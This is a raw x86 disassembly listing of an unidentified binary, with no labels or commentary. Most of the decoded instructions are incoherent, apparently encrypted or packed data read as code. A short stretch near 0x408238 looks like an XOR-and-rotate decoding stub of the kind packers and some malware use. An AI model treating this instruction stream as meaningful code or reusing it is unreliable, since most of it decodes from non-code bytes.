  407f3f:	cmp    BYTE PTR [ecx-0x65],al
  407f42:	leave  
  407f43:	sub    cl,al
  407f45:	mov    bh,0x91
  407f47:	sbb    eax,0xdec67390
  407f4c:	(bad)  
  407f4d:	fidiv  DWORD PTR [ebp+0x1abfcf78]
  407f53:	call   0xf1aefc24
  407f58:	mov    edi,0x5ad37cf7
  407f5d:	repnz inc ebx
  407f5f:	pop    edi
  407f60:	dec    eax
  407f61:	fwait
  407f62:	fwait
  407f63:	test   BYTE PTR [esi-0xb34832e],0x43
  407f6a:	int    0xdd
  407f6c:	sub    ebp,eax
  407f6e:	pop    edx
  407f6f:	loop   0x407f9f
  407f71:	cmc    
  407f72:	inc    edx
  407f73:	pop    ebp
  407f74:	js     0x407f28
  407f76:	arpl   WORD PTR [ebx],cx
  407f78:	imul   edi,DWORD PTR [esi],0xaef5fe09
  407f7e:	add    DWORD PTR [esi-0x1c],esi
  407f81:	add    ah,BYTE PTR [edx]
  407f83:	mov    bl,0xe7
  407f85:	sbb    ah,BYTE PTR [eax+0x3b]
  407f88:	lea    ecx,[eax+0x73]
  407f8b:	sub    al,0x34
  407f8d:	fcmove st,st(6)
  407f8f:	and    DWORD PTR [ecx+0x61f62107],0x30
  407f96:	(bad)  
  407f97:	imul   esi,DWORD PTR [edx+0x6f1cb41b],0xfffffff1
  407f9e:	mov    esi,0x9b85cfe0
  407fa3:	jle    0x407fa5
  407fa5:	or     eax,0xf18f90ac
  407faa:	sbb    eax,0x2e5bceb6
  407faf:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  407fb1:	ja     0x408011
  407fb3:	push   esp
  407fb4:	push   0xfe20d434
  407fb9:	inc    ebx
  407fba:	jge    0x407fbc
  407fbc:	into   
  407fbd:	pusha  
  407fbe:	(bad)  
  407fbf:	cmovg  esi,DWORD PTR [ebx-0x3856681b]
  407fc6:	icebp  
  407fc7:	adc    BYTE PTR [ecx-0x637253db],bl
  407fcd:	test   eax,0xb2334f3b
  407fd3:	jmp    0x407f9c
  407fd5:	xchg   ebx,eax
  407fd6:	jp     0x407fc8
  407fd8:	cld    
  407fd9:	jmp    0xadf84076
  407fde:	xor    DWORD PTR [edx],eax
  407fe0:	bswap  esp
  407fe2:	jmp    0x8a819820
  407fe7:	mov    ss,ecx
  407fe9:	mov    cl,0x48
  407feb:	int    0x68
  407fed:	out    0xb3,al
  407fef:	xor    esi,esp
  407ff1:	test   eax,0x9b656e7b
  407ff6:	or     BYTE PTR [ebx-0x73],cl
  407ff9:	pop    edi
  407ffa:	aas    
  407ffb:	ret    
  407ffc:	in     eax,dx
  407ffd:	fld    DWORD PTR [ebp-0x7b]
  408000:	pop    esi
  408001:	test   dl,0x9b
  408004:	pop    esp
  408005:	pop    ecx
  408006:	outs   dx,BYTE PTR ds:[esi]
  408007:	ret    
  408008:	daa    
  408009:	xchg   edx,eax
  40800a:	scas   al,BYTE PTR es:[edi]
  40800b:	or     BYTE PTR [esi-0x5e],0xe1
  40800f:	aas    
  408010:	aaa    
  408011:	jne    0x408025
  408013:	(bad)  
  408014:	out    dx,al
  408015:	rcr    BYTE PTR [ebx-0x75],0x73
  408019:	test   BYTE PTR [eax+esi*4+0x61],cl
  40801d:	sub    dl,BYTE PTR [edx]
  40801f:	sub    cl,ch
  408021:	icebp  
  408022:	rcl    DWORD PTR [esi+0x41da88c8],cl
  408028:	xchg   ecx,eax
  408029:	sbb    eax,0x33e28515
  40802e:	call   0xf8bb:0xe79d4861
  408035:	and    cl,al
  408037:	sti    
  408038:	aas    
  408039:	mov    cs,eax
  40803b:	int    0x75
  40803d:	sub    BYTE PTR [ecx+0x2b],dl
  408040:	call   0x9830:0xb2af8154
  408047:	not    BYTE PTR ds:0x5de20572
  40804d:	aad    0x3c
  40804f:	adc    ebx,ebp
  408051:	push   esi
  408052:	mov    ah,0xc8
  408054:	jge    0x407fe8
  408056:	out    dx,eax
  408057:	adc    al,ah
  408059:	add    DWORD PTR [edi+0x7e],0x20
  40805d:	shr    DWORD PTR [ebp-0x44e8586e],cl
  408063:	imul   esi,edi,0xffffffe6
  408066:	mov    bl,0xe7
  408068:	jmp    0x40808e
  40806a:	std    
  40806b:	mov    al,0x34
  40806d:	out    dx,eax
  40806e:	pop    eax
  40806f:	in     eax,0x18
  408071:	mov    eax,0x4606db4a
  408076:	ss jge 0x408023
  408079:	dec    esi
  40807a:	loop   0x408027
  40807c:	inc    edi
  40807d:	inc    ebx
  40807e:	imul   esp,DWORD PTR [ebp+0x66e2c5ec],0x510709c6
  408088:	mov    BYTE PTR [eax-0x6196f607],bl
  40808e:	inc    edx
  40808f:	fwait
  408090:	dec    eax
  408091:	push   ebx
  408092:	outs   dx,BYTE PTR ds:[esi]
  408093:	push   cs
  408094:	lea    ebp,ds:0x632d4ea3
  40809a:	xchg   ecx,eax
  40809b:	or     DWORD PTR ds:0xa623e4ef,ecx
  4080a1:	add    cl,BYTE PTR [ebp-0x4c6d3b28]
  4080a7:	stc    
  4080a8:	mov    ds:0x5e40c29e,al
  4080ad:	sbb    dh,BYTE PTR [eax+0x19]
  4080b0:	js     0x408038
  4080b2:	ret    0x9d33
  4080b5:	cwde   
  4080b6:	test   esp,ebx
  4080b8:	and    esp,DWORD PTR [bp+si]
  4080bb:	push   0xffffffde
  4080bd:	(bad)  
  4080bf:	push   eax
  4080c0:	pop    ecx
  4080c1:	test   al,0x79
  4080c3:	jmp    0x53f0:0x21f4b90c
  4080ca:	cli    
  4080cb:	fcomp  DWORD PTR [esp+esi*4]
  4080ce:	adc    eax,0x31f47e8a
  4080d3:	cmc    
  4080d4:	add    DWORD PTR [ecx+edi*4],ebx
  4080d7:	dec    edx
  4080d8:	xchg   esi,eax
  4080d9:	xchg   ebp,eax
  4080da:	xor    BYTE PTR [edi+edx*4],dl
  4080dd:	xchg   esi,eax
  4080de:	jmp    0xa06a:0x752a9369
  4080e5:	fwait
  4080e6:	and    BYTE PTR [edi],0xb9
  4080e9:	scas   al,BYTE PTR es:[edi]
  4080ea:	sbb    esi,esp
  4080ec:	jp     0x40808d
  4080ee:	test   eax,0x5b7fbb37
  4080f3:	pusha  
  4080f4:	fist   WORD PTR [edi+0x6bd6ff04]
  4080fa:	or     al,0x5e
  4080fc:	fwait
  4080fd:	mov    ds:0x48ed8702,eax
  408102:	inc    edx
  408103:	xchg   esi,eax
  408104:	js     0x408137
  408106:	pop    ds
  408107:	test   al,0x3e
  408109:	xor    edi,0xab285182
  40810f:	cmp    DWORD PTR [edi+eiz*4],eax
  408112:	shr    eax,0xc2
  408115:	add    eax,0x2b971342
  40811a:	or     eax,0x18262f7a
  40811f:	adc    bh,BYTE PTR es:[ebx]
  408122:	dec    ecx
  408123:	sub    eax,0xb091b5e5
  408128:	(bad)  
  408129:	loopne 0x408125
  40812b:	adc    ebx,DWORD PTR [eax]
  40812d:	js     0x40812b
  40812f:	mov    ds:0xad8d5537,eax
  408134:	or     DWORD PTR [ecx-0x17],edx
  408137:	jmp    0xbdc44a4a
  40813c:	xchg   edi,eax
  40813d:	(bad)  
  40813e:	mov    es,WORD PTR [esi-0x2]
  408141:	push   es
  408142:	mov    bl,0xd0
  408144:	mov    ecx,0x3caf8501
  408149:	add    esp,ecx
  40814b:	xchg   BYTE PTR [ebp+0x60],cl
  40814e:	sti    
  40814f:	inc    ecx
  408150:	push   0x6aa8f7ca
  408155:	sbb    eax,0xb34c946d
  40815a:	sub    eax,0x5ca3a11c
  40815f:	mov    ecx,0xe2c917f0
  408164:	std    
  408165:	scas   al,BYTE PTR es:[edi]
  408166:	mov    al,ds:0x69e144d9
  40816b:	sbb    ebx,DWORD PTR [edx]
  40816d:	xchg   edx,eax
  40816e:	mov    esp,0xbd835316
  408173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408174:	ins    BYTE PTR es:[edi],dx
  408175:	fsubr  DWORD PTR [ebx]
  408177:	push   cs
  408178:	add    eax,DWORD PTR [eax+0x6787eb12]
  40817e:	cmp    DWORD PTR [ebx],esi
  408180:	push   es
  408181:	jns    0x4081a4
  408183:	outs   dx,DWORD PTR ds:[esi]
  408184:	out    0x96,al
  408186:	or     dl,0x89
  408189:	push   es
  40818a:	cmp    bl,BYTE PTR [esi*4+0x691fc008]
  408191:	repnz sets ch
  408195:	mov    al,0xd9
  408197:	mov    bh,0x8d
  408199:	push   edi
  40819a:	out    0xec,eax
  40819c:	scas   al,BYTE PTR es:[edi]
  40819d:	hlt    
  40819e:	mov    ebx,0x175f2979
  4081a3:	fisttp DWORD PTR [ebx]
  4081a5:	jb     0x408223
  4081a7:	dec    ecx
  4081a8:	jns    0x408173
  4081aa:	pop    esp
  4081ab:	or     BYTE PTR ss:0x8fa10d6c,ah
  4081b2:	mov    ecx,0x8aa1a704
  4081b7:	jno    0x408159
  4081b9:	and    DWORD PTR [edx-0x521b759b],ebx
  4081bf:	cmp    DWORD PTR [ecx+0x63],ebx
  4081c2:	mov    al,ds:0xd18e39af
  4081c7:	sub    al,0xd7
  4081c9:	fs aad 0x4c
  4081cc:	mov    al,ds:0xdb6991cd
  4081d1:	test   eax,0x31166d9b
  4081d6:	ja     0x40819f
  4081d8:	push   cs
  4081d9:	stc    
  4081da:	call   0xa41641db
  4081df:	xchg   esp,eax
  4081e0:	cwde   
  4081e1:	cmp    cl,dl
  4081e3:	stos   DWORD PTR es:[edi],eax
  4081e4:	xor    eax,0x339c01df
  4081e9:	sub    DWORD PTR [esi],eax
  4081eb:	aaa    
  4081ec:	xor    al,0xda
  4081ee:	adc    eax,0xc78dd0b7
  4081f3:	pop    ebx
  4081f4:	lock mov dl,0x6
  4081f7:	call   0x8753e3e4
  4081fc:	mov    dh,0x75
  4081fe:	adc    dh,al
  408200:	div    BYTE PTR [ebx]
  408202:	pop    ds
  408203:	in     eax,0x40
  408205:	and    DWORD PTR [ecx+0x11f0454d],edi
  40820b:	or     esi,DWORD PTR [edx]
  40820d:	jne    0x4081b3
  40820f:	jle    0x4081fc
  408211:	jne    0x408269
  408213:	inc    ecx
  408214:	inc    esi
  408215:	fld    TBYTE PTR [ebx-0x7af7a389]
  40821b:	sbb    al,0x93
  40821d:	cmp    cl,BYTE PTR [eax]
  40821f:	js     0x408203
  408221:	push   ebx
  408222:	daa    
  408223:	inc    eax
  408224:	icebp  
  408225:	shl    cl,cl
  408227:	jl     0x408235
  408229:	sub    BYTE PTR [ecx],ch
  40822b:	xchg   esi,eax
  40822c:	out    0xa8,al
  40822e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40822f:	shl    DWORD PTR [edx+eiz*2-0x7408c37a],0x45
  408237:	int3   
  408238:	xor    DWORD PTR ds:0x42a2b2,0x7a5d
  408242:	xor    al,0xaa
  408244:	mov    cl,0xf
  408246:	sub    cl,al
  408248:	xor    DWORD PTR ds:0x42a2d2,0x74a5
  408252:	add    dl,cl
  408254:	or     DWORD PTR ds:0x42a266,edi
  40825a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40825d:	xor    cl,0xaa
  408260:	sub    cl,0xf
  408263:	ror    dl,cl
  408265:	sub    DWORD PTR ds:0x42a27e,edi
  40826b:	xor    eax,eax
  40826d:	mov    eax,DWORD PTR [ebp-0xc]
  408270:	sub    DWORD PTR ds:0x42a2d6,0x42a2fa
  40827a:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  408281:	adc    ecx,DWORD PTR ds:0x42a292
  408287:	jmp    0x40a638
  40828c:	or     ch,BYTE PTR [ebp-0x21]
  40828f:	mov    WORD PTR [eax+0x5de90a8a],ds
  408295:	hlt    
  408296:	jne    0x408240
  408298:	xchg   ebx,eax
  408299:	push   ebx
  40829a:	fdiv   DWORD PTR [edi+eax*8]
  40829d:	adc    eax,0x5eef8383
  4082a2:	add    DWORD PTR [ebx-0x4b2a2aee],0x39
  4082a9:	push   ecx
  4082aa:	fld    QWORD PTR [ecx+0x37]
  4082ad:	inc    esi
  4082ae:	stos   DWORD PTR es:[edi],eax
  4082af:	repz xor al,0xb1
  4082b2:	jmp    0x4082e1
  4082b4:	stos   DWORD PTR es:[edi],eax
  4082b5:	adc    al,0x99
  4082b7:	sbb    eax,0x31dcba2c
  4082bc:	cwde   
  4082bd:	jmp    0x5d9:0xc5ec5411
  4082c4:	adc    eax,0xd4ea9d8b
  4082c9:	inc    edi
  4082ca:	pop    ss
  4082cb:	pushf  
  4082cc:	add    al,BYTE PTR ds:0xe6594134
  4082d2:	sbb    ch,bh
  4082d4:	adc    ecx,DWORD PTR [edx-0x444875e2]
  4082da:	cmp    DWORD PTR [ebx],ebp
  4082dc:	pop    esi
  4082dd:	mov    al,0xfc
  4082df:	jo     0x40832a
  4082e1:	dec    ebp
  4082e2:	fadd   DWORD PTR [ebx+0x1792b0be]
  4082e8:	jmp    0x4082cd
  4082ea:	int3   
  4082eb:	icebp  
  4082ec:	addr16 enter 0xf4b5,0xf1
  4082f1:	retf   
  4082f2:	add    al,0xac
  4082f4:	mov    ds:0xc69b4945,al
  4082f9:	(bad)  
  4082fa:	leave  
  4082fb:	adc    BYTE PTR [esi-0x21],bl
  4082fe:	push   cs
  4082ff:	mov    eax,0xf4ac3fbf
  408304:	shl    DWORD PTR [ecx-0x36d5d97b],0x3a
  40830b:	xchg   BYTE PTR [eax+edx*2],cl
  40830e:	inc    ebp
  40830f:	mov    BYTE PTR [edx+0xe],ch
  408312:	daa    
  408313:	loopne 0x408318
  408315:	push   eax
  408316:	jg     0x4082ad
  408318:	or     dh,bl
  40831a:	aaa    
  40831b:	dec    edi
  40831c:	fwait
  40831d:	loop   0x408384
  40831f:	dec    edx
  408320:	jno    0x4082e6
  408322:	ds pop esp
  408324:	std    
  408325:	lods   eax,DWORD PTR ds:[esi]
  408326:	jge    0x40831b
  408328:	adc    al,0x51
  40832a:	imul   edx,edi,0x44
  40832d:	call   0x6b50:0xf23bd437
  408334:	mov    eax,0x4f99fb33
  408339:	stc    
  40833a:	sahf   
  40833b:	daa    
  40833c:	jmp    0xb574:0xbd0583b2
  408343:	adc    DWORD PTR [edi-0x60af3755],ecx
  408349:	adc    cl,dl
  40834b:	adc    DWORD PTR [ebp+0x364f3fa1],ebx
  408351:	push   eax
  408352:	mov    edi,0xc307b857
  408357:	jmp    0xbca2:0x26dd7d99
  40835e:	pop    edi
  40835f:	inc    edi
  408360:	pop    eax
  408361:	mov    DWORD PTR [edi],ecx
  408363:	and    eax,0xeaf6cc98
  408368:	fistp  QWORD PTR [ebp+0x60800b3c]
  40836e:	fisub  DWORD PTR gs:[ebx+0x3076450d]
  408375:	adc    cl,BYTE PTR [edi+0x14]
  408378:	cmp    DWORD PTR [bx+si+0x3b],0x5a3dede2
  408380:	adc    al,0xba
  408382:	or     esi,eax
  408384:	mov    bl,0x35
  408386:	mov    edi,0x9a66dca
  40838b:	mov    ds,WORD PTR [edx-0x6dfe07d4]
  408391:	fwait
  408392:	dec    esi
  408393:	push   edx
  408394:	sahf   
  408395:	pop    ss
  408396:	pusha  
  408397:	cli    
  408398:	or     DWORD PTR [ecx+0x4a109e3b],edx
  40839e:	outs   dx,BYTE PTR ds:[esi]
  40839f:	cmc    
  4083a0:	dec    edx
  4083a1:	das    
  4083a2:	cs push eax
  4083a4:	int3   
  4083a5:	ret    0x1925
  4083a8:	bound  edi,QWORD PTR [ebp+0x3fe8f1e0]
  4083ae:	lods   eax,DWORD PTR ds:[esi]
  4083af:	xchg   BYTE PTR [edx-0x72b85d41],dh
  4083b5:	sbb    BYTE PTR [eax],0xb5
  4083b8:	ret    0x9c7f
  4083bb:	cmp    ch,bh
  4083bd:	imul   bh
  4083bf:	mov    esp,0xa9cfc428
  4083c4:	and    al,0x56
  4083c6:	sub    BYTE PTR [ecx+0x2a63404b],dl
  4083cc:	(bad)  
  4083cd:	icebp  
  4083ce:	leave  
  4083cf:	outs   dx,DWORD PTR ds:[esi]
  4083d0:	lods   eax,DWORD PTR ds:[esi]
  4083d1:	jmp    0x4083f2
  4083d3:	mov    bl,0xe5
  4083d5:	les    ebx,FWORD PTR [esi+0x7a]
  4083d8:	or     eax,edx
  4083da:	retf   
  4083db:	arpl   bx,dx
  4083dd:	aam    0xaf
  4083df:	sub    eax,0xa2d48cef
  4083e4:	mov    dl,0x52
  4083e6:	fsub   QWORD PTR [ecx]
  4083e8:	mov    al,0x58
  4083eb:	cwde   
  4083ec:	mov    bh,0x79
  4083ee:	retf   
  4083ef:	fwait
  4083f0:	out    dx,eax
  4083f1:	addr16 ret 
  4083f3:	mov    WORD PTR ds:0x693d00b1,?
  4083f9:	(bad)  
  4083fb:	cwde   
  4083fc:	popf   
  4083fd:	popf   
  4083fe:	fsub   QWORD PTR [edi+0x4704643]
  408404:	test   DWORD PTR [ebx+0x40c91245],ebp
  40840a:	push   ebp
  40840b:	adc    ebp,esi
  40840d:	lods   al,BYTE PTR ds:[esi]
  40840e:	and    DWORD PTR [edx],eax
  408410:	lods   eax,DWORD PTR ds:[esi]
  408411:	dec    esi
  408412:	js     0x408456
  408414:	jmp    0x40845c
  408416:	ds stc 
  408418:	cmp    al,0x9c
  40841a:	lahf   
  40841b:	aas    
  40841c:	std    
  40841d:	mov    edx,DWORD PTR [eax-0x19aaab95]
  408423:	fwait
  408424:	mov    bl,0x5b
  408426:	fsubr  DWORD PTR [edi-0x1d]
  408429:	out    dx,al
  40842a:	das    
  40842b:	retf   
  40842c:	pop    ds
  40842d:	lods   eax,DWORD PTR ds:[esi]
  40842e:	or     dh,ch
  408430:	les    esp,FWORD PTR [ebx-0x2]
  408433:	pop    edx
  408434:	test   DWORD PTR [ebx],edi
  408436:	enter  0x2de1,0x3e
  40843a:	xchg   esi,eax
  40843b:	mov    ch,0x97
  40843d:	mov    ch,0xc1
  40843f:	and    esi,DWORD PTR [ebx-0x509ba165]
  408445:	int    0xd2
  408447:	rol    BYTE PTR [edi+edx*2-0x46b7dff0],1
  40844e:	jo     0x408407
  408450:	pusha  
  408451:	shl    DWORD PTR [ecx-0x5],1
  408454:	push   0x53
  408456:	mov    al,ds:0xf8afd006
  40845b:	fxtract 
  40845d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40845e:	ins    BYTE PTR es:[edi],dx
  40845f:	mov    edi,0x7fa3d348
  408464:	dec    ebx
  408465:	rol    al,1
  408467:	shr    DWORD PTR [ecx],cl
  408469:	pop    eax
  40846a:	add    al,0x4f
  40846c:	mov    esp,0x56a452ce
  408471:	add    eax,0x9e58ca81
  408476:	push   ebp
  408477:	scas   eax,DWORD PTR es:[edi]
  408478:	xchg   edx,eax
  408479:	fsub   st(1),st
  40847b:	jbe    0x408437
  40847d:	shl    DWORD PTR [eax-0x32],1
  408480:	fldcw  WORD PTR [ebx-0x5ba8551e]
  408486:	fwait
  408487:	jle    0x4084b0
  408489:	stos   DWORD PTR es:[edi],eax
  40848a:	pop    edx
  40848b:	mov    si,0xe7af
  40848f:	adc    eax,0x443605b3
  408494:	sbb    ecx,DWORD PTR [ebx-0x6fb8d934]
  40849a:	xchg   esi,eax
  40849b:	push   esp
  40849c:	int3   
  40849d:	repz or al,0x82
  4084a0:	loope  0x4084bd
  4084a2:	add    al,0xda
  4084a4:	nop
  4084a5:	pop    esi
  4084a6:	push   0xd0751724
  4084ab:	inc    esi
  4084ac:	jbe    0x40848b
  4084ae:	dec    ebx
  4084af:	jg     0x40848e
  4084b1:	jo     0x408457
  4084b3:	push   ebx
  4084b4:	mov    cl,BYTE PTR [ecx+eiz*8-0x79]
  4084b8:	int3   
  4084b9:	(bad)  
  4084ba:	jmp    0x4084c2
  4084bc:	stos   DWORD PTR es:[edi],eax
  4084bd:	pusha  
  4084be:	out    0xe8,al
  4084c0:	cdq    
  4084c1:	or     cx,WORD PTR [edx]
  4084c4:	push   esi
  4084c5:	cs aam 0xf2
  4084c8:	sbb    al,0xf1
  4084ca:	sub    eax,0x4eb4924f
  4084cf:	push   eax
  4084d0:	sbb    eax,0xf6786f32
  4084d5:	add    dh,BYTE PTR [edi+0x1fc70ca5]
  4084db:	push   0x3c242356
  4084e0:	push   0xe363fb1f
  4084e5:	mov    WORD PTR [edx-0x31047903],es
  4084eb:	lock bound ebp,QWORD PTR [ebx-0x31]
  4084ef:	test   dh,dh
  4084f1:	mov    ch,0x9b
  4084f3:	adc    eax,0xe27c864
  4084f8:	xor    ebx,DWORD PTR [esi]
  4084fa:	dec    esi
  4084fb:	imul   ecx,DWORD PTR [edi+esi*4+0x24a958a9],0xfffffffe
  408503:	dec    esi
  408504:	sar    esp,1
  408506:	test   eax,0x9cad9c5
  40850b:	lock fimul WORD PTR [edx+0x2977810d]
  408512:	imul   esp,DWORD PTR [edx-0x68],0x28
  408516:	cmp    esi,DWORD PTR [esi]
  408518:	aaa    
  408519:	or     al,0xf0
  40851b:	test   DWORD PTR [eax+0x52348e73],edi
  408521:	loopne 0x408512
  408523:	jae    0x40858f
  408525:	mov    edi,edx
  408527:	(bad)
  40852a:	jns    0x4084b8
  40852c:	enter  0xdc4e,0x90
  408530:	pop    ecx
  408531:	sbb    bh,BYTE PTR [ebp-0x3d]
  408534:	(bad)  
  408535:	xchg   edi,eax
  408536:	arpl   WORD PTR [edi+0x376b524b],bp
  40853c:	cld    
  40853d:	into   
  40853e:	sahf   
  40853f:	and    dl,dl
  408541:	xchg   edx,eax
  408542:	lds    esi,FWORD PTR ds:0x197a3759
  408548:	popa   
  408549:	pop    ss
  40854a:	sbb    al,0x82
  40854c:	imul   edx,ebp,0xb89bfe0d
  408552:	shr    DWORD PTR [ecx-0x74e4fb68],0x5f
  408559:	inc    eax
  40855a:	outs   dx,BYTE PTR ds:[esi]
  40855b:	jo     0x408510
  40855d:	cdq    
  40855e:	jns    0x408591
  408560:	push   0xcdbd956c
  408565:	call   0x75e2:0xaeb0f3a1
  40856c:	mov    esi,0x406f151a
  408571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408572:	fistp  DWORD PTR [ebx+0x78]
  408575:	cwde   
  408576:	outs   dx,DWORD PTR gs:[esi]
  408578:	or     ebx,DWORD PTR [ecx+edi*4-0x35e40498]
  40857f:	sub    al,0xa1
  408581:	mov    esp,0x7c13e933
  408586:	sbb    al,0x72
  408588:	xchg   edx,eax
  408589:	loope  0x40858f
  40858b:	out    dx,al
  40858c:	mov    al,ds:0x96a52354
  408591:	scas   al,BYTE PTR es:[edi]
  408592:	mov    al,0xc0
  408594:	(bad)  
  408595:	test   eax,0x3052b4fc
  40859a:	cmp    BYTE PTR [ebx-0x5d37008f],bh
  4085a0:	nop
  4085a1:	xor    dh,BYTE PTR [esi+0x6445c0a7]
  4085a7:	jl     0x40858c
  4085a9:	fadd   DWORD PTR [edx+0x4aad084c]
  4085af:	(bad)  
  4085b0:	jb     0x408533
  4085b2:	dec    ebx
  4085b3:	or     bl,al
  4085b5:	fwait
  4085b6:	lods   al,BYTE PTR ds:[esi]
  4085b7:	hlt    
  4085b8:	dec    ecx
  4085b9:	inc    edi
  4085ba:	bound  esi,QWORD PTR [ebx]
  4085bc:	test   al,0x71
  4085be:	sub    BYTE PTR [edi+0x4a],ah
  4085c1:	mov    ch,0x74
  4085c3:	iret   
  4085c4:	dec    ecx
  4085c5:	punpckhwd mm1,QWORD PTR [edi]
  4085c8:	and    DWORD PTR [eax-0x426b309b],0xffffffc8
  4085cf:	aas    
  4085d0:	fadd   st,st(1)
  4085d2:	(bad)  
  4085d3:	jl     0x408628
  4085d5:	jno    0x408573
  4085d7:	jbe    0x4085ee
  4085d9:	icebp  
  4085da:	dec    edi
  4085db:	popf   
  4085dc:	call   0xa907142d
  4085e1:	inc    ebp
  4085e2:	out    dx,al
  4085e3:	ins    BYTE PTR es:[edi],dx
  4085e4:	inc    ecx
  4085e5:	out    0xf3,eax
  4085e7:	repz adc al,0xee
  4085ea:	ins    BYTE PTR es:[edi],dx
  4085eb:	leave  
  4085ec:	inc    ecx
  4085ed:	int3   
  4085ee:	dec    esi
  4085ef:	cwde   
  4085f0:	stos   BYTE PTR es:[edi],al
  4085f1:	inc    edi
  4085f2:	mov    al,ds:0x717edb59
  4085f7:	mov    WORD PTR ds:0x4c4f2d01,ss
  4085fd:	out    dx,eax
  4085fe:	cmc    
  4085ff:	daa    
  408600:	jp     0x4085ab
  408602:	xchg   DWORD PTR [edi+0x6e5c27d2],esi
  408608:	dec    ecx
  408609:	or     dl,BYTE PTR [eax+eax*1+0x12b369d3]
  408610:	(bad)  
  408611:	std    
  408612:	or     al,0xd1
  408614:	test   bh,ch
  408616:	dec    edi
  408617:	mov    ah,0xdc
  408619:	xor    al,BYTE PTR [edi-0x512600b8]
  40861f:	adc    BYTE PTR [ebx+0x72006aa5],cl
  408625:	and    ch,al
  408627:	push   edi
  408628:	test   BYTE PTR ds:[ebx],ch
  40862b:	mov    bh,0x27
  40862d:	jno    0x4085c0
  40862f:	sahf   
  408630:	lods   eax,DWORD PTR ds:[esi]
  408631:	int3   
  408632:	rcr    DWORD PTR [ecx+0x6385d737],0xf8
  408639:	cmp    cl,0xd1
  40863c:	test   al,0x1e
  40863e:	pop    ecx
  40863f:	mov    bh,0xa
  408641:	adc    bh,bh
  408643:	scas   al,BYTE PTR es:[edi]
  408644:	mov    esi,0x311166d8
  408649:	mov    dl,0x88
  40864b:	inc    eax
  40864c:	and    esi,ecx
  40864e:	or     dh,BYTE PTR [edx+0x5d]
  408651:	mov    bh,dh
  408653:	test   esp,edx
  408655:	ja     0x4085f3
  408657:	outs   dx,DWORD PTR ds:[esi]
  408658:	scas   eax,DWORD PTR es:[edi]
  408659:	aas    
  40865a:	scas   eax,DWORD PTR es:[edi]
  40865b:	jae    0x40861c
  40865d:	cmp    al,bl
  40865f:	cdq    
  408660:	jle    0x408609
  408662:	rcl    esp,1
  408664:	not    DWORD PTR [edx+0x5b]
  408667:	les    ecx,FWORD PTR [eax+0x2a]
  40866a:	cs push esp
  40866c:	xchg   ebp,ebp
  40866e:	sbb    dh,ch
  408670:	pop    edi
  408671:	sub    ah,BYTE PTR [edx-0x47]
  408674:	xor    edi,DWORD PTR [edi+ebp*4-0x6f]
  408678:	xor    DWORD PTR ds:[ebx],eax
  40867b:	test   eax,0x2bbb1ac9
  408680:	inc    eax
  408681:	fstp   DWORD PTR [edi-0x451e1988]
  408687:	(bad)  
  408688:	out    dx,al
  408689:	adc    bh,al
  40868b:	int    0x5c
  40868d:	jg     0x4086cc
  40868f:	into   
  408690:	xchg   BYTE PTR [ecx-0x45],bl
  408693:	lock inc esi
  408695:	fimul  DWORD PTR ds:0xac557d27
  40869b:	call   0x9e0e:0xf5cb95d1
  4086a2:	call   0xaaf81c7c
  4086a7:	lahf   
  4086a8:	xor    edi,DWORD PTR [esi]
  4086aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086ab:	mov    al,cl
  4086ad:	out    0xfe,eax
  4086af:	inc    esi
  4086b0:	les    ebp,FWORD PTR [ebx+0x4a71e709]
  4086b6:	aam    0xee
  4086b8:	inc    esi
  4086b9:	push   esi
  4086ba:	into   
  4086bb:	(bad)  
  4086bc:	fcom   st(4)
  4086be:	add    al,0x7c
  4086c0:	(bad)  
  4086c1:	in     eax,dx
  4086c2:	cli    
  4086c3:	pop    ss
  4086c4:	push   esp
  4086c5:	sub    BYTE PTR [eax-0x5e],dh
  4086c8:	sub    dh,BYTE PTR [eax]
  4086ca:	sar    WORD PTR [edx-0x180248d5],0xa1
  4086d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086d3:	popa   
  4086d4:	nop
  4086d5:	and    al,dh
  4086d7:	push   edi
  4086d8:	jae    0x408684
  4086da:	cs int 0x1d
  4086dd:	inc    esi
  4086de:	(bad)
  4086e2:	inc    esi
  4086e3:	clc    
  4086e4:	inc    edx
  4086e5:	or     dh,bl
  4086e7:	cmp    eax,0x52
  4086ea:	fwait
  4086eb:	jo     0x4086b3
  4086ed:	mov    ds:0x3dfa91,al
  4086f2:	jmp    0xc2239e3d
  4086f7:	xor    BYTE PTR [ebp-0x73],0x38
  4086fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086fc:	outs   dx,BYTE PTR ds:[esi]
  4086fd:	sbb    al,0xf3
  4086ff:	ss lock push cs
  408702:	jmp    0x4f92:0xb43dc11d
  408709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40870a:	dec    eax
  40870b:	sub    BYTE PTR [esi+0x4d],ch
  40870e:	test   al,0xb
  408710:	fistp  WORD PTR [edx+0x38]
  408713:	imul   ecx,DWORD PTR ds:0xc449ed52,0x4d33cd5d
  40871d:	mov    ds:0x24cd894a,al
  408722:	xor    bh,0x37
  408725:	repnz mov eax,ds:0x1cf0f8ba
  40872c:	outs   dx,BYTE PTR ds:[esi]
  40872d:	ret    0xdaaa
  408730:	idiv   eax
  408732:	push   edi
  408733:	inc    ecx
  408734:	idiv   DWORD PTR [ebp-0x59]
  408737:	sbb    eax,0xd2367c33
  40873c:	fist   WORD PTR [ebp-0x4a]
  40873f:	push   edx
  408740:	or     eax,0x97af2ac
  408745:	xor    dh,BYTE PTR [eax]
  408747:	mov    ecx,0x98932326
  40874c:	test   eax,0x1792f681
  408751:	gs into 
  408753:	push   eax
  408754:	dec    ebx
  408755:	sub    ecx,DWORD PTR [esi]
  408757:	push   ecx
  408758:	xlat   BYTE PTR ds:[ebx]
  408759:	rcl    BYTE PTR [ebx+0x73728336],1
  40875f:	mov    esp,0x866322e5
  408764:	scas   al,BYTE PTR es:[edi]
  408765:	fld    QWORD PTR ds:0x3eae198e
  40876b:	sub    BYTE PTR [ebp-0x41],ch
  40876e:	mov    cl,BYTE PTR [ebx]
  408770:	outs   dx,DWORD PTR ds:[esi]
  408771:	xor    BYTE PTR [esi+ebx*8],al
